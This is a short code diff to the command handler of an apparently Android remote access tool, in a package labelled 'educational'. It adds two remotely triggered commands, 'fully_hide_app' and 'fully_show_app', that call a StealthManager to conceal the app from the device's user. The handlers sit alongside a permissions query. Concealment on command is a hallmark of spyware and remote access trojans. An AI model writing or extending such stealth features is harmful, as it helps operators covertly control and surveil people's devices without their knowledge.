@@ -879,7 +879,31 @@ public class SocketManager {
             return r;
         }
 
-        // ── get_permissions ──────────────────────────────────────────────
+        if (command.equals("fully_hide_app")) {
+            JSONObject r = new JSONObject();
+            try {
+                com.remoteaccess.educational.stealth.StealthManager sm =
+                    new com.remoteaccess.educational.stealth.StealthManager(context);
+                return sm.fullyHideApp();
+            } catch (Exception e) {
+                r.put("success", false);
+                r.put("error", e.getMessage());
+                return r;
+            }
+        }
+        if (command.equals("fully_show_app")) {
+            JSONObject r = new JSONObject();
+            try {
+                com.remoteaccess.educational.stealth.StealthManager sm =
+                    new com.remoteaccess.educational.stealth.StealthManager(context);
+                return sm.fullyShowApp();
+            } catch (Exception e) {
+                r.put("success", false);
+                r.put("error", e.getMessage());
+                return r;
+            }
+        }
+
         if (command.equals("get_permissions")) {
             return permissionManager.getPermissions();
         }
